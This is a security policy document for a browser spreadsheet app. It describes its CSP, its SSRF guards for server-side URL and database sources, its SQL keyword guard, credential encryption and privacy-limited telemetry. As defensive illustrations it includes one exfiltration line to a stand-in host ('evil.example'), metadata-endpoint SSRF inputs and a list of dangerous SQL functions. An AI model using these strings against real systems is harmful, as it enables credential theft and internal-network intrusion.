# Security Policy

## Reporting a vulnerability

Please report security issues **privately**, not as a public issue:

- Use [GitHub's private vulnerability reporting](https://github.com/SuruchBoss/ExcelToGo/security/advisories/new)
  on this repository (Security → Report a vulnerability).

Please include what you did, what happened, and what you expected. A proof of concept helps.
This is a personal project, so there is no bounty and no guaranteed response time — but reports
are welcome and will be credited unless you'd rather not be.

## Which versions get fixes

Only the `main` branch. There are no released versions or maintained branches yet.

## Live data connected from the browser

Most of the app runs entirely in the browser: the spreadsheet, the formula engine, import/export,
charts and conditional formatting never send your data anywhere. Sheets live in that browser's
`localStorage`.

Live data comes in two kinds, and they are guarded differently because different machines make the
request. **A source connected from the browser** (`src/lib/dataSources/browserSource.ts`) is fetched by
the visitor's own browser, straight from their machine to their API — including one behind their VPN
or inside their office. This app's server takes no part: the URL, the header and the data are never
sent to it, and an e2e flow records every request the page makes to `/api/*` and checks that none
carries any of the three.

- **The request:** `fetch` with `mode: "cors"`, `credentials: "omit"` (no cookies, so a company
  single-sign-on cookie is never sent by accident), `cache: "no-store"`. Only `https://`, or `http://`
  on `localhost` / `127.0.0.1`; anything else is refused before a request is made. Next-page links are
  followed only on the source's own origin, and the header goes only to that origin.
- **`urlGuard` is deliberately not used here.** It exists so that nobody can point *this server* at
  *this server's* network. On this path the network is the user's own, reached with the user's own
  permissions; an internal address is the use case, not an attack. What stands between the page and an
  origin is the browser (CORS, mixed content, private-network rules) and the page's CSP, below.
- **The header value** lives in `sessionStorage`, keyed by the source's id (`browserSecrets.ts`), and
  nowhere else — not `localStorage` with the source's other settings, not the workbook, not an exported
  .xlsx/.csv/.pdf, not a crash report, not the usage counter, not any request to `/api/*`. Closing the
  tab forgets it and the app asks again. A token that outlives the tab is one a shared computer hands to
  the next person. A query parameter that looks like a credential (`token=`, `key=`, `apikey=`,
  `access_token=`, …) is flagged in the form so it can be moved into the header.
- **Redirects are the browser's.** It drops `Authorization` on a cross-origin redirect but keeps other
  custom header names, and the API decides where it redirects. A page cannot follow redirects by hand
  the way the server does, because it is not allowed to read where a cross-origin redirect points.

### The CSP opens one user's origins to that user only

`connect-src` is narrow on purpose: it is what stops an injected script from sending the visitor's own
Anthropic key (in `sessionStorage`, see below) somewhere else. Opening it for everyone so that this
feature works would throw that away. Instead:

- When a user saves a browser source, **only the origin** of its URL (scheme, host and port — no path,
  no query) is written to a first-party cookie, `etg-api-origins` (`Path=/`, `SameSite=Strict`,
  `Secure`, one year).
- `src/proxy.ts` reads the cookie on each request and appends to *that user's* `connect-src` **only the
  entries that pass validation** (`src/lib/apiOrigins.ts`): exactly `https://host[:port]`, or
  `http://localhost[:port]` / `http://127.0.0.1[:port]`, parsed with `new URL()` and re-derived from
  `.origin`, so the string that reaches the header is one `URL` produced rather than one the cookie did.
  No wildcard, no `*`, no `https:` scheme source, no credentials, no spaces, `;`, `'` or `,`; at most
  20; anything else is dropped silently.
- The fallback policy in `next.config.ts` is unchanged and never reads the cookie. **Someone who never
  adds a source gets exactly the policy they always had, character for character** — checked by
  `apiOrigins.test.ts` and by an e2e flow that reads the real header before and after a source is added.
- A new origin takes one page reload to apply, since a page's policy is fixed when it loads. The app
  does the reload for the user, and only if the last autosave succeeded. Deleting the last source for an
  origin removes that origin from the cookie.

**The trade-off, stated plainly:** a user who adds an API lets this page talk to that origin. If a
script were ever injected into the page, it could write an origin of its own into the cookie too, and
that would take effect after a reload. This design keeps the strict policy for everyone who does not
use the feature; it does not fix XSS. Neither does CSP in general — it cannot stop a top-level
navigation (`location = "https://evil.example/?k=" + key`) either, which is why a strict `script-src`
(nonce plus `'strict-dynamic'`, `src/proxy.ts`) is the part that makes injection itself hard.

**Not yet verified:** the private-network point in the app's checklist for IT (Chrome/Edge may want
`Access-Control-Allow-Private-Network: true`, or the user allowing local network access) has not been
tested against a real internal address.

## Server-side live data sources: how they are guarded

The **server-side sources** are the other kind: they ask *this app's server* to fetch a URL, or open a
database, on someone's behalf. They exist only on a deployment that sets `SOURCES_ADMIN_TOKEN` — without
it the UI does not show them at all. Three things guard them, and all three matter if you put this where
other people can reach it.

### 1. The API is off unless you switch it on

`/api/sources`, `/api/sources/[id]`, `/api/sources/[id]/data` and `/api/sources/test` all require
`SOURCES_ADMIN_TOKEN`, sent as `X-Sources-Token` (or `Authorization: Bearer`). With no token
configured the API **refuses every request with 403 `sources_disabled`** rather than serving
anybody — being unreachable is only a bad default if the alternative isn't "anyone on the internet
can drive the server's HTTP client", and it is.

One shared operator token rather than accounts, because that matches the documented shape of the
feature: one technical person sets the sources up, everyone else just sees the data. The browser
keeps it in `sessionStorage`, so closing the browser asks again.

There is no exception any more. A deployment used to be able to serve three built-in sample sources
with no token; that is gone (#109), and the server no longer seeds `data/sources.json` either.
`NEXT_PUBLIC_DEMO_MODE=1` is still read, for deployments that set it, and now means exactly one
thing: every server-side source route refuses with 403 `server_sources_off`, **even with a token
set** — kept rather than removed so an old setting cannot silently switch a server feature *on*. The
sample feeds under `/api/sample/*` still exist for screenshots and tests, and the list in
`src/lib/server/demoSources.ts` (app-relative URLs, no credential, GET only, exact-id lookup — pinned
by `demoSources.test.ts`) is kept for a future follow-along sample.

A wrong token is compared in constant time, and "switched off" and "wrong token" are reported
differently so an operator can tell which they are looking at.

### 2. A source cannot reach your private network

Before every request — and again after **every redirect**, because a 302 is how a checked URL
becomes an unchecked one — the destination is resolved and every address it resolves to is checked.
Blocked: loopback, link-local (including `169.254.169.254`, the cloud metadata endpoint on AWS, GCP
and Azure alike), RFC 1918 private ranges, carrier-grade NAT, multicast, and the reserved and
documentation ranges (IPv4, and IPv6's `2001:db8::/32`). IPv6 link-local and unique-local go too.
An IPv4 address carried inside an IPv6 one is unpacked and checked as the IPv4 address it is, for
these forms: IPv4-mapped `::ffff:169.254.169.254` and the hex form `::ffff:a9fe:a9fe` a URL
normalises it to, the deprecated IPv4-compatible `::a9fe:a9fe`, SIIT's IPv4-translated
`::ffff:0:a9fe:a9fe` (RFC 6145), NAT64's well-known prefix
`64:ff9b::a9fe:a9fe` (RFC 6052 — on an IPv6-only subnet the gateway really does turn that into
169.254.169.254) and 6to4 `2002:a9fe:a9fe::` (RFC 3056). A public IPv4 address reached through
NAT64 still works, since that is the only way an IPv6-only host reaches one. The local-use NAT64
prefix `64:ff9b:1::/48` (RFC 8215) is refused outright: where its IPv4 sits depends on a prefix
length the address does not state. So is Teredo, `2001::/32` (RFC 4380), which carries its IPv4
obscured and is switched off almost everywhere. Only `http` and `https` are allowed.

A URL beginning with a single `/` is one of the app's own routes and is the one case the guard is
skipped for — an app-relative source such as the sample feed `/api/sample/sales` is reached even when the
deployment's own origin is loopback. "Its own route" is decided by resolving the URL and comparing the *resolved origin* to the
deployment's, not by the leading slash alone: `//169.254.169.254/` and `/\169.254.169.254/` also
begin with a slash, but resolve to a foreign host, so they clear the full guard like any absolute
URL. (A pentest found the earlier leading-slash shortcut let exactly these through to the metadata
endpoint; there are now regression tests at both the validation and the fetch layer.)

Set `SOURCES_ALLOWED_HOSTS` to a comma-separated list to narrow it further to named hosts. The
address checks still apply on top of it: being allowlisted is not a licence to point at loopback.

**What this does not fully close:** the address is checked and then the connection is made, and in
between the name could in principle be re-resolved to something else. Closing that completely means
pinning the connection to the checked address, which Node's `fetch` does not expose. The bar is
raised a very long way; it is not claimed to be airtight.

### 2b. A database source: a different protocol, the same problem

A Postgres or MySQL source hands the server a connection string and one saved statement, and the
server opens the connection. That is the same request-forgery primitive as a URL with a different
protocol on the front — `postgres://u:p@169.254.169.254:80/x` is a port scan with a friendly error
message — so the same resolve-and-check runs before the driver is loaded, over the same blocked
ranges.

**One rule is deliberately different, and it is a loosening.** A database on a private address is
the *normal* case: an RDS instance inside a VPC, a Postgres container beside the app. Applying the
REST rule would make the feature useless in exactly the deployments it exists for. So the private-
address rule still stands by default and `SOURCES_ALLOWED_DB_HOSTS` is the way past it: an operator
who names a host there has said, in an environment only they can write, that the server may reach
it. Nothing a browser sends can add to that list, and a near miss (`evil.db.internal` against an
allowed `db.internal`) is not a match. A connection string naming a **unix socket** — either as a
path host or as the `?host=` parameter the Postgres driver prefers over the host in the URL — is
refused outright: a socket would step around every address check by not using an address.

**The query is guarded twice, and only one of the two is a guarantee.**

- **The guarantee:** every query runs inside a read-only transaction (`begin read only` /
  `set session transaction read only`), so a write is refused by the database itself whatever the
  text said. MySQL connections are opened with `multipleStatements: false`, so one string cannot
  carry a second statement past a check that only read the first.
- **The early warning:** `src/lib/dataSources/sqlGuard.ts` refuses, at save time, anything that is
  not a single `SELECT`/`WITH` — a second statement, a write keyword, `SELECT … INTO OUTFILE`,
  `pg_read_file`, `load_file`, `pg_sleep`. It scans the statement with comments, strings, quoted
  identifiers and Postgres dollar-quoting blanked out (blanked, not deleted, so nothing can be
  spliced together), and an unterminated comment or quote is a refusal rather than a guess.

A keyword list can always be walked around; a read-only transaction cannot. Both are here because
the first produces a clear error while the operator is still looking at the form and the second
produces a correct outcome at three in the morning, and those are not the same job.

Row counts are capped by the database rather than after the fact — the saved statement is wrapped
in `select * from (…) limit n` — and a statement timeout bounds the rest, so a saved query cannot
hold a connection open forever on a refresh loop.

**What this does not close:** the database account is yours to scope. This app cannot stop a query
reading a table you would rather it did not, and the right answer is a read-only role that can see
only what the source is meant to publish. The connection is encrypted only if the string asks for
it (`sslmode=require`, `?ssl=true`); `sslmode=disable` is honoured as written, because a connection
that merely *looks* encrypted is worse than one that admits it is not.

### 2c. A source's credential goes only to the source's own origin

An auth header belongs to the origin of the URL the source was set up with — its scheme, host and
port. It is sent to that origin and nowhere else:

- **A redirect to another origin is followed, without the header.** Redirects are followed by hand
  so that every hop can be checked (above), which means `fetch`'s own rule of dropping
  `Authorization` on a cross-origin redirect does not apply by itself; the same rule is applied
  here, to whatever header name the source uses. Once dropped it is not put back, even if a later
  hop returns to the original origin. `https` → `http` on the same host counts as another origin.
- **A next-page link on another origin is not followed at all.** Paging stops there, the rows
  already fetched are kept, and the table is marked partial. A redirect to a CDN is ordinary HTTP;
  an API whose pages continue on a different host is not something to follow blind.

A source reached through the app's own path (an app-relative URL such as a sample feed) is unaffected.

### 2d. One refresh has a size and a time it cannot exceed

Reliability as much as security — reaching this needs the operator token, or control of an API the
operator chose — but a URL that turns out to point at a 2 GB export should cost a failed refresh,
not the server's memory. All five numbers live in `src/lib/dataSources/fetchLimits.ts`.

- **About 49 MB of body per refresh, across every page, counted after decompression.** One kilobyte
  per row at the 50,000-row ceiling the form offers; measured before choosing it, 50,000 rows are
  8.1 MB for the sample orders feed and 34.9 MB for twenty fields of mostly Thai text. The body is read as
  a stream and the read stops the moment it passes the budget, rather than after `res.text()` has
  taken the lot; a `content-length` over the budget is refused before a byte is read. Counted after
  decompression because `fetch` inflates gzip and brotli before this code sees anything, and 53 KB
  on the wire was measured turning into 40 MB of text.
- **15 seconds per request, from sending it to the body's last byte.** The timer used to be
  cleared the moment the headers arrived, so a server that answered at once and then sent a byte a
  second held a refresh open for as long as it liked.
- **45 seconds across every redirect and page of one refresh**, enforced inside each request as
  well as between pages.
- **4 MB of table sent on to the browser per refresh.** Vercel refuses a function response over
  4.5 MB, so a bigger table is cut to the rows that fit and marked partial for its size instead of
  failing as a 413; the same number applies self-hosted, so a source behaves alike on both.

Hitting either on the first page fails the refresh with a code the data panel turns into a
sentence in the reader's language; hitting either on a later page keeps the rows already fetched
and marks the table partial, the same as the 20-page ceiling does.

### 3. Source credentials are encrypted at rest

An auth header attached to a source is encrypted with AES-256-GCM under `SOURCES_SECRET_KEY` before
it is written to `data/sources.json`, and decrypted only at the moment it is put on an outgoing
request. **A database connection string is a credential in the same sense and is handled the same
way** — it is ciphertext for the whole of its life and plaintext only for the moment a connection
is opened. What the browser is sent is a description rather than the string: the kind, the host and
the database name, never the user and never the password. If the stored string cannot be read for
any reason the answer is the mask, not a best guess. Without that key configured, the app **refuses to store a credential** rather than writing
one in the clear. Values written before this existed are still readable and are re-encrypted the
next time that source is saved.

This does not make the file safe to publish — somebody who can read the file can usually read the
environment too — but it stops the ordinary losses: a backup copied somewhere less guarded, a
tarball pasted into a chat, a snapshot restored onto another machine. GCM also means a tampered
ciphertext fails loudly instead of quietly becoming somebody's `Authorization` header.

### Still true

The data file is per-deployment, not per-user: anyone holding the operator token sees and edits the
same set of sources. That is the intended shape of the feature, not an oversight.

## What an exported file carries

- **CSV:** a value beginning `=`, `+`, `-`, `@`, a tab or a newline is written with a leading apostrophe,
  so the next program reads it as text; numbers are never touched (`src/lib/csvInjection.test.ts`).
- **`.xlsx`:** a formula goes out as a formula only if this app's engine can parse it. One it cannot
  parse — already an error in the app — goes out as a text cell, and reads back in as text
  (`src/lib/xlsxFormulaExport.test.ts`). Formulas the engine reads are unchanged, including ones that
  arrived from a CSV, as they would be if Excel itself had opened and saved that file.

## Counting that the app was used, without learning who used it

`/api/usage` answers one question — has anyone actually used this — and it is at odds with the
sentence the landing page leads with, so the shape is the argument rather than a footnote to it.

**Off unless a deployment switches it on.** `NEXT_PUBLIC_USAGE=1`, and nothing else. A clone of
this repo sends nothing, ever, and there is no default endpoint to forget to unset. The flag is
checked again in the route, so a post to a deployment that said no is refused rather than quietly
recorded — and a `check:e2e` flow drives the acts that are wired to count on an ordinary build and
asserts that **zero** requests reach `/api/usage`, because "this bundle sends nothing" is a claim
about the build and not about a function.

**The event name is the whole payload, and it comes from a fixed list of seven.** This is the
load-bearing part, not a tidiness preference. The policy already allows the page to talk to its own
origin, so a free-text field here would be a ready-made way for a bug — or an injected script — to
post a cell's contents somewhere and have it look like telemetry. A closed union cannot carry a
spreadsheet. The same list is checked in the browser, again in the route, and a third time in SQL;
only the third is one an attacker cannot skip by not using the browser.

**At most once per event per page load**, held in memory and never written down, so there is no id
to persist and nothing to correlate across visits. It also changes what is measured, on purpose:
*did this happen at all*, not *how many times* — a per-keystroke counter is a behavioural trace
wearing a number's clothes.

**No time of day, no IP, no user agent, no referrer, no cookie, no session.** A request carries the
first four whether anyone wants them or not; what matters is that none are kept, and the route's
tests send all four and assert that what reaches storage is the event name alone. The user agent is
the one that is *read*: the route drops a request whose user agent contains `HeadlessChrome` (the
browser already declines to send when `navigator.webdriver` is set or its own user agent says the
same), and the value goes out of scope with the request — not stored, not logged. A bot that
disguises itself as a person is still counted; this filters only the ones that say what they are. The day is
stamped by `current_date` in the database, because a date that arrives over the network is a field
somebody eventually makes more precise, and an exact time plus a rare event is an identifier.

**Do Not Track and Global Privacy Control are honoured.** An app whose whole argument is "we do not
take your data" does not get to ignore the browser saying the same thing.

What is stored is `(day, event) → count`. The table has row-level security on and **no policy of
any kind** — deliberately, so the key the server holds cannot read a row back; it may call
`bump_usage` and nothing else. That is the one table in this project in that shape, and
`policies.test.ts` lists it by name so the "RLS on with nothing written" check still applies
everywhere else.

**One finding from applying all of this to a real project**, recorded because the test that should
have caught it did not: Supabase's database linter reported four functions with a mutable
`search_path`. All four are in `0001`–`0002`, none is `security definer` — three triggers and one
`immutable` helper — which is exactly why `policies.test.ts` passed over them; it only asked about
definers. `0005_pin_search_paths.sql` pins them, and the test now asks it of **every** function in
the migrations rather than only the ones where it is most dangerous.

**The security advisor's other warning, and `0007`.** It lists every `security definer` function
`anon` can call through `/rest/v1/rpc/…`. None was a hole — `can_access_workbook` / `owns_workbook`
answer from the caller's own token, so a signed-out caller always got `false`, and
`snapshot_workbook` is a trigger — but nothing needed the grant either, so
`0007_revoke_unneeded_execute.sql` takes it away: the trigger is callable by nobody (Postgres does
not check EXECUTE when a trigger fires), and the two access checks keep EXECUTE for
`authenticated` only, because the policies call them with the caller's rights. That order matters:
six policies had been written without a `to` clause, which means `to public`, and with those left
as they were the revoke would have turned a signed-out request's empty answer into "permission
denied for function". So `0007` scopes them to `authenticated` first. Replayed on a real Postgres
16 before it was written down here: signed out still reads zero rows without an error, a signed-in
owner and a member still read, write and leave versions behind. `bump_usage` stays callable by
`anon` — that is the whole design of the counter.

**What it cannot tell you**, said here so nobody reads more into a number than is in it: how many
*people* (two visits from one person and one each from two are the same number), whether anyone
came back, where they came from, or anything at all about a single visit.

## Cloud save is optional, and it is your database

`NEXT_PUBLIC_SUPABASE_URL` / `NEXT_PUBLIC_SUPABASE_ANON_KEY` are unset by default, and while they
are, none of the cloud code can run: the button is not rendered and the client library is never
downloaded. The app stays what it was — sheets in `localStorage`, nothing sent anywhere.

Set them and the browser talks **directly to your Supabase project**. Nothing is proxied through
this app's server, so a deployment never sees its users' spreadsheets. Two things to know:

- **The anon key is public by design.** It ships to the browser, as it is meant to. What protects
  the data is row-level security, which `supabase/migrations/0001_workbooks.sql` sets up: a row is
  readable, writable and deletable only by the account that owns it. **Run that migration** — an
  unprotected table with a public key is readable by anyone who opens the page.
- **Never put a service-role key in these variables.** It bypasses every policy, and being
  `NEXT_PUBLIC_` it would be handed to every visitor.
- **Sharing is only as safe as your project's email confirmation.** A workbook is shared with an
  *email address*, and `can_access_workbook()` (`0002_sharing_and_realtime.sql`) lets in whoever's
  sign-in token carries that address. That is sound only while the project will not issue such a
  token before the address has been proven. If "Confirm email" is off, anyone holding the public anon
  key can sign up through Supabase's API — with a password, whatever the app's own magic-link screen
  shows — as an address that was invited, and open the workbook. **Before you share anything, check
  in the Supabase dashboard, under Authentication → Sign In / Providers → Email:**
  - **Confirm email** is on (self-hosted: `GOTRUE_MAILER_AUTOCONFIRM=false`), so sign-up does not
    return a session until the link in the email is clicked;
  - **Secure email change** is on, so changing an account's address to an invited one needs the new
    address confirmed too;
  - any other sign-in provider you enable only hands over addresses it has verified itself.

  This app cannot see those settings, so nothing in it can check them for you. Inviting by user id
  instead of by address would remove the dependency; it is on the roadmap, not built.

Running cloud save means running a database for whoever signs into your deployment, with the
obligations that carries. That is the reason it is off by default rather than something this
project hosts for everyone.

## Your own API key

`ANTHROPIC_API_KEY` is read on the server only and is never sent to the browser. Keep it in
`.env.local`, which is gitignored — `.env.example` is a template and holds no value.

`/api/ai/formula` deliberately requires no token: the assistant is a feature of the app, not an
admin tool. It is rate limited instead — **20 calls per minute per client address**, refused with
`429` and a `Retry-After`. That slows a careless script or a stuck retry loop. **It does not protect
your Anthropic bill**: the address it counts by is one a client can choose (below), so a script that
sends a different one each time is never limited. What protects the bill is the next paragraph.

**The route uses the server's key whenever one is set** — the same on a public deployment as on your
own machine. **If you set `ANTHROPIC_API_KEY` on a public deployment, everyone who uses the site uses
the assistant on your key and your bill.** The only billing control is not setting it there: without a
key the local keyword matcher answers, which costs nothing, and a visitor can bring their own key,
which goes from their browser straight to Anthropic and never touches this route. The public site at
excel-to-go.vercel.app is meant to run without one.

`NEXT_PUBLIC_DEMO_MODE=1` used to make the route behave as if no key were configured. **It no longer
does** (#109): the public site is not a demo, and a key someone sets should behave as it does
self-hosted. `src/app/api/ai/formula/route.test.ts` pins both halves: with no key the SDK is never
constructed, and the old switch does not hide a configured key. Before deploying that change, or
removing `NEXT_PUBLIC_DEMO_MODE` from a public deployment, confirm that neither `ANTHROPIC_API_KEY` nor
`SOURCES_ADMIN_TOKEN` is set there.

The counters are held in the serving process's memory. Two instances behind a load balancer count
separately and a serverless cold start forgets everything, so this is a guard against casual abuse,
**not a billing control**; a real one needs shared storage, which this project does not have. The
address comes from `x-forwarded-for`, which a client can forge — rotating it gets a fresh allowance
on every call, which is why the paragraph above does not claim more — so it is used
for counting only and never for authorisation — and the limiter caps how many distinct keys it will
hold, because otherwise a spray of forged addresses would exhaust memory and turn the limiter into
the denial of service it exists to prevent.
